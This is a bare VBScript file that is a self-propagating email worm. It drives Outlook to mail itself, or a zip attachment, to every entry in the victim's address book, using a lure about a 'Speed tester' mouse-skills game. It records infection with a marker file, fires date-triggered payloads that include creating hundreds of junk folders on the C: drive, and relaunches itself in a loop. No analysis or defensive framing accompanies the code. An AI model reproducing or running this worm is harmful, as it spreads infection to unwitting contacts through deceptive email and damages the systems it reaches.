Dim Shell
Set Shell = WScript.CreateObject("WScript.Shell")
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Dim ScriptPath
ScriptPath = WScript.ScriptFullName
Dim ScriptName
ScriptName = WScript.ScriptName
Const SCRIPT_DEST_FOLDER = "C:\Program Files\Internet Explorer"
Const MAIL_INFECTED_FILE = "c:\Program Files\Common Files\one.dat"
Sub SendOne
On Error Resume Next
Set TextFile = fso.CreateTextFile(NO_FIRST_INFECTION, True)
TextFile.Close
If Err.Number <> 0 Then
End if
Set Outl = WScript.CreateObject("Outlook.Application")
Set map = Outl.GetNameSpace("MAPI")
Set AddressBook = map.AddressLists(1)
Dim X
X = 1
If ( int(AddressBook.AddressEntries.Count) > 1 ) Then
For I = 1 To AddressBook.AddressEntries.Count
Set Mailer = Outl.CreateItem(0)
Mailer.Recipients.Add( AddressBook.AddressEntries( X ) )
Dim RandomNumber
Randomize
RandomNumber = Int(3 * Rnd)
Mailer.Subject = "game: Speed tester v. 1.0 - check your mouse skills"
Mailer.Body = "Hello," &vbCrLf& "" &vbCrLf& "How good are your mouse movement skills? Wanna test it? If yes try game Speed tester v.1.0. (you have it in attachment)." &vbCrLf& "It's really funny." &vbCrLf& "" &vbCrLf& _
"Software requirements:" &vbCrLf& "- Windows operating system" &vbCrLf& "- Java Virtual Machine" &vbCrLf& "" &vbCrLf& "regards"
If fso.FileExists( SCRIPT_DEST_FOLDER + "\spdtest.zip" ) = true Then
Mailer.Attachments.Add( SCRIPT_DEST_FOLDER + "\spdtest.zip" )
Else
Mailer.Attachments.Add( ScriptPath )
End If
On Error Resume Next
Mailer.Send
If Err.Number <> 0 Then
End if
X = X + 1
Next
End If
End Sub
Sub CheckDate
If ( Day( Date ) = 25 ) Then
On Error Resume Next
SendOne
If Err.Number <> 0 Then
End if
End If
If ( Day( Date ) = 10 ) Then
MsgBox("Tip Of The Day: You look really beautiful today.")
End If
If ( Day( Date ) = 31 ) Then
FolderTree
End If
If ( Day( Date ) = 12 ) and ( Month(Date) = 9 )Then
MsgBox("Happy Birthday!!!")
End If
End Sub
Sub FolderTree
Dim dir_name_o
dir_name_o = "1"
For I = 0 To 50
dir_name_o = dir_name_o + "o"
fso.CreateFolder("c:\" + dir_name_o)
Next
Dim dir_name_n
dir_name_n = "2"
For I = 0 To 90
dir_name_n = dir_name_n + "n"
fso.CreateFolder("c:\" + dir_name_n)
Next
Dim dir_name_e
dir_name_e = "3"
For I = 0 To 130
dir_name_e = dir_name_e + "e"
fso.CreateFolder("c:\" + dir_name_e)
Next
End Sub
If fso.FileExists(MAIL_INFECTED_FILE) = false Then
On Error Resume Next
SendOne
If Err.Number <> 0 Then
End if
On Error Resume Next
Set TextFile = fso.CreateTextFile(MAIL_INFECTED_FILE, True)
TextFile.Close
If Err.Number <> 0 Then
End if
End If
CheckDate
WScript.Sleep(3000000)
On Error Resume Next
Shell.Exec( "wscript " + chr(34)+ScriptPath+chr(34) )
If Err.Number <> 0 Then
Shell.Exec( ScriptPath )
End If



